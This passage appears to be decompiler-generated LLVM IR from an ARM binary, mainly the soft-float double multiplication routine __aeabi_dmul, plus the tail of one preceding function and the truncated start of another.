  uselistorder i32 3, { 65, 13, 47, 83, 48, 84, 85, 86, 88, 89, 19, 90, 91, 0, 68, 66, 67, 14, 92, 8, 1, 2, 9, 10, 3, 4, 49, 50, 102, 51, 52, 53, 54, 55, 56, 94, 6, 25, 95, 87, 26, 27, 76, 28, 77, 29, 78, 30, 79, 31, 80, 64, 7, 69, 57, 103, 15, 98, 21, 99, 20, 100, 22, 97, 58, 59, 11, 93, 12, 96, 5, 60, 23, 61, 24, 101, 62, 32, 70, 33, 34, 71, 35, 17, 36, 72, 73, 18, 74, 37, 75, 38, 63, 40, 39, 46, 41, 81, 82, 42, 43, 44, 45, 16 }
  uselistorder label %bb5, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__aeabi_dmul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1ea24 = load i32, i32* @r4, align 4
  store i32 %v3_1ea24, i32* %stack_var_-16, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v4_1ea30 = udiv i32 %arg1, 1048576
  %v5_1ea30 = urem i32 %v4_1ea30, 2048
  store i32 %v5_1ea30, i32* %r4.global-to-local, align 4
  %v6_1ea30 = icmp eq i32 %v5_1ea30, 0
  br i1 %v6_1ea30, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v5_1ea34 = udiv i32 %arg3, 1048576
  %v6_1ea34 = urem i32 %v5_1ea34, 2048
  store i32 %v6_1ea34, i32* @r5, align 4
  %v7_1ea34 = icmp eq i32 %v6_1ea34, 0
  br i1 %v7_1ea34, label %.thread1, label %bb41

bb41:                                             ; preds = %bb
  %v5_1ea38 = icmp eq i32 %v5_1ea30, 2047
  br i1 %v5_1ea38, label %.thread1, label %bb42

bb42:                                             ; preds = %bb41
  %v5_1ea3c = icmp eq i32 %v6_1ea34, 2047
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb, %bb41, %bb42
  %v0_1ea40 = phi i1 [ true, %bb ], [ true, %bb41 ], [ %v5_1ea3c, %bb42 ], [ true, %entry ]
  store i32 125508, i32* %lr.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %v0_1ea40, i32 ptrtoint (i32* @global_var_1ecc0.1784 to i32))
  %v0_1ea44 = load i32, i32* %r4.global-to-local, align 4
  %v1_1ea44 = load i32, i32* @r5, align 4
  %v2_1ea44 = add i32 %v1_1ea44, %v0_1ea44
  store i32 %v2_1ea44, i32* %r4.global-to-local, align 4
  %v2_1ea48 = xor i32 %arg3, %arg1
  %v1_1ea4c = load i32, i32* %ip.global-to-local, align 4
  %tmp = mul i32 %v1_1ea4c, -2097152
  %v5_1ea4c = add i32 %tmp, -1
  %v6_1ea4c = and i32 %v5_1ea4c, %arg1
  store i32 %v6_1ea4c, i32* %r0.global-to-local, align 4
  %v6_1ea50 = and i32 %v5_1ea4c, %arg3
  store i32 %v6_1ea50, i32* %r2.global-to-local, align 4
  %v4_1ea54 = mul i32 %arg1, 4096
  %v5_1ea54 = or i32 %v4_1ea54, %arg2
  %v7_1ea54 = icmp eq i32 %v5_1ea54, 0
  br i1 %v7_1ea54, label %.thread, label %bb43

.thread:                                          ; preds = %.thread1
  %v1_1ea5c17 = or i32 %v6_1ea4c, 1048576
  store i32 %v1_1ea5c17, i32* %r0.global-to-local, align 4
  %v1_1ea6018 = or i32 %v6_1ea50, 1048576
  store i32 %v1_1ea6018, i32* %r2.global-to-local, align 4
  %v1_1eb9819 = and i32 %v2_1ea48, -2147483648
  br label %dec_label_pc_1eb98

bb43:                                             ; preds = %.thread1
  %v5_1ea58 = mul i32 %arg3, 4096
  %v6_1ea58 = or i32 %v5_1ea58, %arg4
  %v8_1ea58 = icmp eq i32 %v6_1ea58, 0
  %v1_1ea5c = or i32 %v6_1ea4c, 1048576
  store i32 %v1_1ea5c, i32* %r0.global-to-local, align 4
  %v1_1ea60 = or i32 %v6_1ea50, 1048576
  store i32 %v1_1ea60, i32* %r2.global-to-local, align 4
  %v1_1eb98 = and i32 %v2_1ea48, -2147483648
  br i1 %v8_1ea58, label %dec_label_pc_1eb98, label %dec_label_pc_1ea68

dec_label_pc_1ea68:                               ; preds = %bb43
  store i32 %v1_1eb98, i32* %stack_var_-40, align 4
  %v9_1ea6c = load i32, i32* @r8, align 4
  %v12_1ea6c = load i32, i32* @sb, align 4
  %v3_1ea70 = udiv i32 %arg2, 65536
  %v3_1ea74 = udiv i32 %arg4, 65536
  store i32 %v3_1ea74, i32* %r8.global-to-local, align 4
  %v3_1ea78 = udiv i32 %v1_1ea5c, 65536
  store i32 %v3_1ea78, i32* %sb.global-to-local, align 4
  %v3_1ea7c = udiv i32 %v1_1ea60, 65536
  %tmp59 = mul i32 %v3_1ea70, -65536
  %v5_1ea80 = add i32 %tmp59, -1
  %v6_1ea80 = and i32 %v5_1ea80, %arg2
  store i32 %v6_1ea80, i32* %r1.global-to-local, align 4
  %tmp60 = mul i32 %v3_1ea74, -65536
  %v5_1ea84 = add i32 %tmp60, -1
  %v6_1ea84 = and i32 %v5_1ea84, %arg4
  %tmp61 = mul i32 %v3_1ea78, -65536
  %v5_1ea88 = add i32 %tmp61, -1
  %v6_1ea88 = and i32 %v6_1ea4c, %v5_1ea88
  store i32 %v6_1ea88, i32* %r0.global-to-local, align 4
  %tmp62 = mul i32 %v3_1ea7c, -65536
  %v5_1ea8c = add i32 %tmp62, -1
  %v6_1ea8c = and i32 %v6_1ea50, %v5_1ea8c
  store i32 %v6_1ea8c, i32* %r2.global-to-local, align 4
  %v2_1ea90 = mul i32 %v6_1ea84, %v6_1ea80
  %v2_1ea94 = mul i32 %v3_1ea74, %v6_1ea80
  %v2_1eaa0 = and i32 %v2_1ea94, 32768
  %v3_1eaa0 = icmp ne i32 %v2_1eaa0, 0
  %v4_1eaa0 = udiv i32 %v2_1ea94, 65536
  %v7_1eaa0 = zext i1 %v3_1eaa0 to i32
  %v2_1eaa4 = mul i32 %v6_1ea84, %v3_1ea70
  %tmp53 = add i32 %v2_1eaa4, %v2_1ea94
  %tmp54 = mul i32 %tmp53, 65536
  %v5_1eaa8 = add i32 %tmp54, %v2_1ea90
  store i32 %v5_1eaa8, i32* %ip.global-to-local, align 4
  %v2_1eaac = and i32 %v2_1eaa4, 32768
  %v3_1eaac = icmp ne i32 %v2_1eaac, 0
  %v4_1eaac = udiv i32 %v2_1eaa4, 65536
  %v7_1eaac = zext i1 %v3_1eaac to i32
  %v2_1eab0 = mul i32 %v3_1ea7c, %v6_1ea80
  %v2_1eabc = and i32 %v2_1eab0, 32768
  %v3_1eabc = icmp ne i32 %v2_1eabc, 0
  %v4_1eabc = udiv i32 %v2_1eab0, 65536
  %v7_1eabc = zext i1 %v3_1eabc to i32
  %v8_1eabc = add nuw nsw i32 %v7_1eabc, %v4_1eabc
  %v2_1eac0 = mul i32 %v6_1ea8c, %v3_1ea70
  %v2_1eac8 = and i32 %v2_1eac0, 32768
  %v3_1eac8 = icmp ne i32 %v2_1eac8, 0
  %v4_1eac8 = udiv i32 %v2_1eac0, 65536
  %v6_1eac8 = add nuw nsw i32 %v8_1eabc, %v4_1eac8
  %v7_1eac8 = zext i1 %v3_1eac8 to i32
  %v8_1eac8 = add nuw nsw i32 %v6_1eac8, %v7_1eac8
  %v2_1eacc = mul i32 %v3_1ea74, %v6_1ea88
  %v2_1ead4 = and i32 %v2_1eacc, 32768
  %v3_1ead4 = icmp ne i32 %v2_1ead4, 0
  %v4_1ead4 = udiv i32 %v2_1eacc, 65536
  %v6_1ead4 = add nuw nsw i32 %v8_1eac8, %v4_1ead4
  %v7_1ead4 = zext i1 %v3_1ead4 to i32
  %v8_1ead4 = add nuw nsw i32 %v6_1ead4, %v7_1ead4
  %v2_1ead8 = mul i32 %v6_1ea84, %v3_1ea78
  %v4_1eadc = mul i32 %v2_1ead8, 65536
  %tmp55 = add i32 %v2_1eac0, %v2_1eab0
  %tmp56 = add i32 %tmp55, %v2_1eacc
  %tmp57 = mul i32 %tmp56, 65536
  %v8_1eaac = add nuw nsw i32 %v7_1eaa0, %v4_1eaa0
  %v5_1eab8 = add nuw nsw i32 %v8_1eaac, %v4_1eaac
  %v5_1eac4 = add nuw nsw i32 %v5_1eab8, %v7_1eaac
  %v5_1ead0 = add i32 %v5_1eac4, %v4_1eadc
  %v5_1eadc = add i32 %v5_1ead0, %tmp57
  %v2_1eae0 = and i32 %v2_1ead8, 32768
  %v3_1eae0 = icmp ne i32 %v2_1eae0, 0
  %v4_1eae0 = udiv i32 %v2_1ead8, 65536
  %v6_1eae0 = add nuw nsw i32 %v8_1ead4, %v4_1eae0
  %v7_1eae0 = zext i1 %v3_1eae0 to i32
  %v8_1eae0 = add i32 %v6_1eae0, %v7_1eae0
  %v2_1eae4 = mul i32 %v3_1ea7c, %v6_1ea88
  %v2_1eae8 = mul nuw i32 %v3_1ea7c, %v3_1ea78
  %v4_1eaec = mul i32 %v2_1eae4, 65536
  %v5_1eaec = add i32 %v8_1eae0, %v4_1eaec
  %v2_1eaf0 = and i32 %v2_1eae4, 32768
  %v3_1eaf0 = icmp ne i32 %v2_1eaf0, 0
  %v4_1eaf0 = udiv i32 %v2_1eae4, 65536
  %v6_1eaf0 = add i32 %v4_1eaf0, %v2_1eae8
  %v7_1eaf0 = zext i1 %v3_1eaf0 to i32
  %v2_1eaf4 = mul i32 %v6_1ea8c, %v3_1ea78
  %v4_1eaf8 = mul i32 %v2_1eaf4, 65536
  %v5_1eaf8 = add i32 %v5_1eaec, %v4_1eaf8
  %v2_1eafc = and i32 %v2_1eaf4, 32768
  %v3_1eafc = icmp ne i32 %v2_1eafc, 0
  %v4_1eafc = udiv i32 %v2_1eaf4, 65536
  %v7_1eafc = zext i1 %v3_1eafc to i32
  %v2_1eb00 = mul i32 %v6_1ea80, %v6_1ea8c
  %v2_1eb04 = add i32 %v2_1eb00, %v5_1eadc
  %v3_1eb04 = icmp ult i32 %v2_1eb04, %v5_1eadc
  %v2_1eb08 = mul nuw i32 %v3_1ea70, %v3_1ea7c
  %v3_1eb0c = add i32 %v5_1eaf8, %v2_1eb08
  %v4_1eb0c = zext i1 %v3_1eb04 to i32
  %v5_1eb0c = add i32 %v4_1eb0c, %v3_1eb0c
  %v9_1eb0c = icmp ule i32 %v5_1eb0c, %v5_1eaf8
  %v10_1eb0c = icmp ult i32 %v3_1eb0c, %v5_1eaf8
  %v11_1eb0c = select i1 %v3_1eb04, i1 %v9_1eb0c, i1 %v10_1eb0c
  %v2_1eb10 = mul i32 %v6_1ea84, %v6_1ea88
  %v2_1eb14 = zext i1 %v11_1eb0c to i32
  %v2_1eb18 = add i32 %v2_1eb10, %v2_1eb04
  %v3_1eb18 = icmp ult i32 %v2_1eb18, %v2_1eb04
  %v0_1eb1c = load i32, i32* %sb.global-to-local, align 4
  %v1_1eb1c = load i32, i32* %r8.global-to-local, align 4
  %v2_1eb1c = mul i32 %v1_1eb1c, %v0_1eb1c
  %v3_1eb20 = add i32 %v2_1eb1c, %v5_1eb0c
  %v4_1eb20 = zext i1 %v3_1eb18 to i32
  %v5_1eb20 = add i32 %v4_1eb20, %v3_1eb20
  %v9_1eb20 = icmp ule i32 %v5_1eb20, %v5_1eb0c
  %v10_1eb20 = icmp ult i32 %v3_1eb20, %v5_1eb0c
  %v11_1eb20 = select i1 %v3_1eb18, i1 %v9_1eb20, i1 %v10_1eb20
  %v2_1eb24 = mul i32 %v1_1eb1c, %v3_1ea70
  %v2_1eb28 = zext i1 %v11_1eb20 to i32
  %v8_1eaf0 = add i32 %v6_1eaf0, %v4_1eafc
  %v6_1eafc = add i32 %v8_1eaf0, %v7_1eaf0
  %v8_1eafc = add i32 %v6_1eafc, %v7_1eafc
  %v3_1eb14 = add i32 %v8_1eafc, %v2_1eb14
  %v3_1eb28 = add i32 %v3_1eb14, %v2_1eb28
  %v2_1eb2c = add i32 %v2_1eb24, %v2_1eb18
  store i32 %v2_1eb2c, i32* %lr.global-to-local, align 4
  %v3_1eb2c = icmp ult i32 %v2_1eb2c, %v2_1eb18
  %v1_1eb30 = load i32, i32* %r2.global-to-local, align 4
  %v2_1eb30 = mul i32 %v1_1eb30, %v6_1ea88
  %v3_1eb34 = add i32 %v5_1eb20, %v2_1eb30
  %v4_1eb34 = zext i1 %v3_1eb2c to i32
  %v5_1eb34 = add i32 %v4_1eb34, %v3_1eb34
  %v9_1eb34 = icmp ule i32 %v5_1eb34, %v5_1eb20
  %v10_1eb34 = icmp ult i32 %v3_1eb34, %v5_1eb20
  %v11_1eb34 = select i1 %v3_1eb2c, i1 %v9_1eb34, i1 %v10_1eb34
  %v2_1eb38 = zext i1 %v11_1eb34 to i32
  %v3_1eb38 = add i32 %v2_1eb38, %v3_1eb28
  %v2_1eb3c = load i32, i32* %stack_var_-40, align 4
  store i32 %v9_1ea6c, i32* %r8.global-to-local, align 4
  store i32 %v12_1ea6c, i32* %sb.global-to-local, align 4
  %v0_1eb40 = load i32, i32* %ip.global-to-local, align 4
  %v2_1eb40 = icmp eq i32 %v0_1eb40, 0
  br i1 %v2_1eb40, label %bb45, label %bb44

bb44:                                             ; preds = %dec_label_pc_1ea68
  %v2_1eb44 = or i32 %v2_1eb2c, 1
  store i32 %v2_1eb44, i32* %lr.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_1ea68, %bb44
  %v0_1eb58 = phi i32 [ %v2_1eb2c, %dec_label_pc_1ea68 ], [ %v2_1eb44, %bb44 ]
  %v0_1eb48 = load i32, i32* %r4.global-to-local, align 4
  %v1_1eb48 = add i32 %v0_1eb48, -255
  %v2_1eb4c = icmp ugt i32 %v3_1eb38, 511
  %v2_1eb50 = icmp eq i1 %v2_1eb4c, false
  %v5_1eb50 = sext i1 %v2_1eb50 to i32
  %v3_1eb50 = add nsw i32 %v5_1eb50, -1023
  %v6_1eb50 = add i32 %v3_1eb50, %v0_1eb48
  store i32 %v6_1eb50, i32* %r4.global-to-local, align 4
  %v3_1eb54 = icmp ugt i32 %v1_1eb48, 768
  br i1 %v3_1eb54, label %dec_label_pc_1eb64, label %dec_label_pc_1eb58

dec_label_pc_1eb58:                               ; preds = %bb45
  %v1_1eb58 = icmp slt i32 %v0_1eb58, 0
  %v2_1eb58 = mul i32 %v0_1eb58, 2
  store i32 %v2_1eb58, i32* %lr.global-to-local, align 4
  %v3_1eb5c = mul i32 %v5_1eb34, 2
  %v4_1eb5c = zext i1 %v1_1eb58 to i32
  %v5_1eb5c = or i32 %v4_1eb5c, %v3_1eb5c
  %v9_1eb5c = icmp ule i32 %v5_1eb5c, %v5_1eb34
  %v10_1eb5c = icmp ult i32 %v3_1eb5c, %v5_1eb34
  %v11_1eb5c = select i1 %v1_1eb58, i1 %v9_1eb5c, i1 %v10_1eb5c
  %v3_1eb60 = mul i32 %v3_1eb38, 2
  %v4_1eb60 = zext i1 %v11_1eb5c to i32
  %v5_1eb60 = or i32 %v4_1eb60, %v3_1eb60
  br label %dec_label_pc_1eb64

dec_label_pc_1eb64:                               ; preds = %bb45, %dec_label_pc_1eb58
  %v0_1eb74 = phi i32 [ %v0_1eb58, %bb45 ], [ %v2_1eb58, %dec_label_pc_1eb58 ]
  %v0_1eb6c = phi i32 [ %v5_1eb34, %bb45 ], [ %v5_1eb5c, %dec_label_pc_1eb58 ]
  %v1_1eb64 = phi i32 [ %v3_1eb38, %bb45 ], [ %v5_1eb60, %dec_label_pc_1eb58 ]
  %v4_1eb64 = mul i32 %v1_1eb64, 2048
  %v4_1eb68 = udiv i32 %v0_1eb6c, 2097152
  %v5_1eb64 = or i32 %v4_1eb68, %v2_1eb3c
  %v5_1eb68 = or i32 %v5_1eb64, %v4_1eb64
  store i32 %v5_1eb68, i32* %r0.global-to-local, align 4
  %v3_1eb6c = mul i32 %v0_1eb6c, 2048
  %v4_1eb70 = udiv i32 %v0_1eb74, 2097152
  %v5_1eb70 = or i32 %v3_1eb6c, %v4_1eb70
  store i32 %v5_1eb70, i32* %r1.global-to-local, align 4
  %v3_1eb74 = mul i32 %v0_1eb74, 2048
  store i32 %v3_1eb74, i32* %lr.global-to-local, align 4
  %v1_1eb78 = add i32 %v6_1eb50, -253
  store i32 %v1_1eb78, i32* %ip.global-to-local, align 4
  %v2_1eb78 = icmp ugt i32 %v6_1eb50, 252
  %v7_1eb78 = icmp eq i32 %v6_1eb50, 253
  %v2_1eb7c = xor i1 %v7_1eb78, true
  %v3_1eb7c = and i1 %v2_1eb78, %v2_1eb7c
  br i1 %v3_1eb7c, label %bb46, label %bb47

bb46:                                             ; preds = %dec_label_pc_1eb64
  %v6_1eb7c = icmp ugt i32 %v1_1eb78, 1791
  %v11_1eb7c = icmp eq i32 %v1_1eb78, 1792
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_1eb64, %bb46
  %v1_1eb80 = phi i1 [ %v7_1eb78, %dec_label_pc_1eb64 ], [ %v11_1eb7c, %bb46 ]
  %v0_1eb80 = phi i1 [ %v2_1eb78, %dec_label_pc_1eb64 ], [ %v6_1eb7c, %bb46 ]
  %v2_1eb80 = xor i1 %v1_1eb80, true
  %v3_1eb80 = and i1 %v0_1eb80, %v2_1eb80
  call void @__pseudo_cond_branch(i1 %v3_1eb80, i32 ptrtoint (i32* @global_var_1ebc4.1785 to i32))
  %v0_1eb84 = load i32, i32* %lr.global-to-local, align 4
  %v2_1eb84 = icmp slt i32 %v0_1eb84, 0
  %v6_1eb84 = icmp eq i32 %v0_1eb84, -2147483648
  %v1_1eb88 = load i32, i32* %r1.global-to-local, align 4
  br i1 %v6_1eb84, label %bb48, label %._crit_edge

bb48:                                             ; preds = %bb47
  %v2_1eb88 = urem i32 %v1_1eb88, 2
  %v3_1eb88 = icmp ne i32 %v2_1eb88, 0
  %v4_1eb88 = udiv i32 %v1_1eb88, 2
  store i32 %v4_1eb88, i32* %lr.global-to-local, align 4
  br label %._crit_edge

._crit_edge:                                      ; preds = %bb47, %bb48
  %v1_1eb8c = phi i1 [ %v3_1eb88, %bb48 ], [ %v2_1eb84, %bb47 ]
  %v2_1eb8c = zext i1 %v1_1eb8c to i32
  %v3_1eb8c = add i32 %v2_1eb8c, %v1_1eb88
  store i32 %v3_1eb8c, i32* %r1.global-to-local, align 4
  %v0_1eb90 = load i32, i32* %r0.global-to-local, align 4
  %v1_1eb90 = load i32, i32* %r4.global-to-local, align 4
  %v2_1eb90 = and i32 %v1_1eb90, 4096
  %v3_1eb90 = icmp ne i32 %v2_1eb90, 0
  %v4_1eb90 = mul i32 %v1_1eb90, 1048576
  %v6_1eb90 = add i32 %v4_1eb90, %v0_1eb90
  %v7_1eb90 = zext i1 %v3_1eb90 to i32
  %v8_1eb90 = add i32 %v7_1eb90, %v6_1eb90
  store i32 %v8_1eb90, i32* %r0.global-to-local, align 4
  %v2_1eb94 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1eb94, i32* %r4.global-to-local, align 4
  ret i32 %v8_1eb90

dec_label_pc_1eb98:                               ; preds = %.thread, %bb43
  %v1_1eb9822 = phi i32 [ %v1_1eb9819, %.thread ], [ %v1_1eb98, %bb43 ]
  %v1_1ea6021 = phi i32 [ %v1_1ea6018, %.thread ], [ %v1_1ea60, %bb43 ]
  %v1_1ea5c20 = phi i32 [ %v1_1ea5c17, %.thread ], [ %v1_1ea5c, %bb43 ]
  %v2_1eb9c = or i32 %v1_1ea5c20, %v1_1eb9822
  %v2_1eba0 = or i32 %arg4, %arg2
  store i32 %v2_1eba0, i32* %r1.global-to-local, align 4
  %v2_1eba4 = xor i32 %v2_1eb9c, %v1_1ea6021
  store i32 %v2_1eba4, i32* %r0.global-to-local, align 4
  %v4_1eba8 = udiv i32 %v1_1ea4c, 2
  %v5_1eba8 = sub i32 %v2_1ea44, %v4_1eba8
  store i32 %v5_1eba8, i32* %r4.global-to-local, align 4
  %v7_1eba8 = sub i32 0, %v5_1eba8
  %v8_1eba8 = and i32 %v2_1ea44, %v7_1eba8
  %v11_1eba8 = icmp eq i32 %v2_1ea44, %v4_1eba8
  %v7_1ebac = icmp sgt i32 %v2_1ea44, %v4_1eba8
  br i1 %v7_1ebac, label %bb49, label %bb50

bb49:                                             ; preds = %dec_label_pc_1eb98
  %v10_1ebac = sub i32 %v1_1ea4c, %v5_1eba8
  %v12_1ebac = xor i32 %v5_1eba8, %v1_1ea4c
  %v13_1ebac = xor i32 %v10_1ebac, %v1_1ea4c
  %v14_1ebac = and i32 %v13_1ebac, %v12_1ebac
  %v17_1ebac = icmp eq i32 %v1_1ea4c, %v5_1eba8
  br label %bb50

bb50:                                             ; preds = %dec_label_pc_1eb98, %bb49
  %v2_1ebb4.in = phi i32 [ %v8_1eba8, %dec_label_pc_1eb98 ], [ %v14_1ebac, %bb49 ]
  %v1_1ebb4.in = phi i32 [ %v5_1eba8, %dec_label_pc_1eb98 ], [ %v10_1ebac, %bb49 ]
  %v0_1ebb4 = phi i1 [ %v11_1eba8, %dec_label_pc_1eb98 ], [ %v17_1ebac, %bb49 ]
  %v1_1ebb4 = icmp slt i32 %v1_1ebb4.in, 0
  %v2_1ebb4 = icmp slt i32 %v2_1ebb4.in, 0
  %v3_1ebb0 = xor i1 %v2_1ebb4, %v1_1ebb4
  %v4_1ebb0 = or i1 %v0_1ebb4, %v3_1ebb0
  br i1 %v4_1ebb0, label %bb52, label %bb51

bb51:                                             ; preds = %bb50
  %v9_1ebb028 = mul i32 %v5_1eba8, 1048576
  %v10_1ebb029 = or i32 %v2_1eba4, %v9_1ebb028
  store i32 %v10_1ebb029, i32* %r0.global-to-local, align 4
  %v7_1ebb4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v7_1ebb4, i32* %r4.global-to-local, align 4
  ret i32 %v10_1ebb029

bb52:                                             ; preds = %bb50
  %v1_1ebb8 = or i32 %v2_1eba4, 1048576
  store i32 %v1_1ebb8, i32* %r0.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v1_1ebc0 = add i32 %v5_1eba8, -1
  store i32 %v1_1ebc0, i32* %r4.global-to-local, align 4
  ret i32 %v1_1ebb8

; uselistorder directives
  uselistorder i32 %v5_1eba8, { 4, 1, 0, 6, 3, 5, 2, 7 }
  uselistorder i32 %v4_1eba8, { 2, 1, 0 }
  uselistorder i32 %v2_1eba4, { 1, 0, 2 }
  uselistorder i32 %v1_1eb88, { 2, 0, 1 }
  uselistorder i32 %v0_1eb84, { 1, 0 }
  uselistorder i1 %v7_1eb78, { 1, 0 }
  uselistorder i32 %v2_1eb58, { 1, 0 }
  uselistorder i1 %v1_1eb58, { 1, 0 }
  uselistorder i32 %v6_1eb50, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1eb58, { 1, 0, 2 }
  uselistorder i32 %v3_1eb38, { 1, 0, 2 }
  uselistorder i32 %v5_1eb34, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v3_1eb34, { 1, 0 }
  uselistorder i1 %v3_1eb2c, { 1, 0 }
  uselistorder i32 %v5_1eb20, { 1, 0, 2, 3 }
  uselistorder i32 %v3_1eb20, { 1, 0 }
  uselistorder i1 %v3_1eb18, { 1, 0 }
  uselistorder i32 %v2_1eb18, { 1, 0, 2 }
  uselistorder i32 %v5_1eb0c, { 2, 1, 0, 3 }
  uselistorder i32 %v3_1eb0c, { 1, 0 }
  uselistorder i1 %v3_1eb04, { 1, 0 }
  uselistorder i32 %v2_1eb04, { 1, 0, 2 }
  uselistorder i32 %v5_1eaf8, { 2, 1, 0 }
  uselistorder i32 %v2_1eaf4, { 1, 2, 0 }
  uselistorder i32 %v2_1eae4, { 0, 2, 1 }
  uselistorder i32 %v5_1eadc, { 1, 0 }
  uselistorder i32 %v2_1ead8, { 1, 2, 0 }
  uselistorder i32 %v2_1eacc, { 1, 0, 2 }
  uselistorder i32 %v2_1eac0, { 1, 0, 2 }
  uselistorder i32 %v2_1eab0, { 1, 0, 2 }
  uselistorder i32 %v2_1eaa4, { 0, 2, 1 }
  uselistorder i32 %v2_1ea94, { 1, 0, 2 }
  uselistorder i32 %v6_1ea8c, { 1, 0, 2, 3 }
  uselistorder i32 %v6_1ea88, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v6_1ea80, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_1ea7c, { 2, 3, 4, 1, 0 }
  uselistorder i32 %v3_1ea78, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v3_1ea74, { 3, 2, 0, 1 }
  uselistorder i32 %v3_1ea70, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v1_1ea60, { 1, 0, 2 }
  uselistorder i32 %v1_1ea5c, { 1, 0, 2 }
  uselistorder i32 %v6_1ea50, { 0, 2, 1, 3 }
  uselistorder i32 %v6_1ea4c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1ea4c, { 5, 2, 3, 4, 1, 0 }
  uselistorder i32 %v2_1ea48, { 1, 0 }
  uselistorder i32 %v2_1ea44, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v6_1ea34, { 2, 1, 0 }
  uselistorder i32 %v5_1ea30, { 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 1, 5, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 4, 5, 6, 7, 8, 9, 1, 10, 0 }
  uselistorder i32 32768, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 2, 15, 3, 1, 14 }
  uselistorder i32 65536, { 3, 1, 4, 158, 5, 159, 2, 6, 7, 8, 9, 160, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 76, 73, 77, 74, 78, 75, 79, 81, 80, 86, 82, 87, 83, 88, 84, 89, 85, 90, 91, 92, 94, 93, 95, 96, 97, 98, 99, 100, 101, 102, 163, 162, 161, 164, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 115, 113, 116, 114, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 151, 152, 150, 153, 155, 156, 154, 157 }
  uselistorder i32* @sb, { 4, 5, 6, 7, 8, 13, 14, 15, 16, 17, 18, 28, 19, 29, 30, 0, 31, 32, 33, 34, 35, 36, 37, 1, 2, 3, 20, 21, 22, 23, 24, 25, 26, 27, 38, 39, 40, 41, 42, 43, 44, 9, 10, 11, 12, 62, 64, 63, 65, 58, 59, 60, 61, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57 }
  uselistorder i32* @r8, { 23, 24, 25, 26, 27, 28, 29, 34, 35, 36, 37, 38, 39, 40, 41, 42, 50, 43, 44, 45, 46, 4, 82, 83, 84, 85, 86, 87, 88, 89, 8, 9, 10, 47, 48, 49, 90, 91, 92, 93, 94, 95, 96, 97, 98, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 0, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 30, 31, 32, 33, 118, 11, 12, 114, 1, 115, 116, 117, 111, 2, 112, 113, 99, 100, 101, 102, 103, 104, 3, 105, 106, 107, 108, 6, 7, 109, 110, 13, 14, 15, 16, 5, 17, 18, 19, 20, 21, 22 }
  uselistorder i32 %arg4, { 1, 2, 0, 3 }
  uselistorder i32 %arg3, { 0, 2, 3, 1, 4 }
  uselistorder i32 %arg2, { 1, 2, 0, 3, 4 }
  uselistorder i32 %arg1, { 0, 2, 3, 1, 4 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_1eb98, { 1, 0 }
  uselistorder label %._crit_edge, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_1eb64, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %.thread1, { 3, 2, 1, 0 }
}

define i32 @function_1ebc4(i32 %arg1) local_unnamed_addr {
dec_label_pc_1ebc4:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %v0_1ebc4 = load i1, i1* @cpsr_z, align 1
  %v1_1ebc4 = load i1, i1* @cpsr_n, align 1
  %v2_1ebc4 = load i1, i1* @cpsr_v, align 1
  %v3_1ebc4 = xor i1 %v1_1ebc4, %v2_1ebc4
  %v4_1ebc4 = or i1 %v0_1ebc4, %v3_1ebc4
  br i1 %v4_1ebc4, label %dec_label_pc_1ebc8, label %dec_label_pc_1ed2c

dec_label_pc_1ebc8:                               ; preds = %dec_label_pc_1ebc4
  %v0_1ebc8 = load i32, i32* @r4, align 4
  %v4_1ebc8 = add i32 %v0_1ebc8, 54
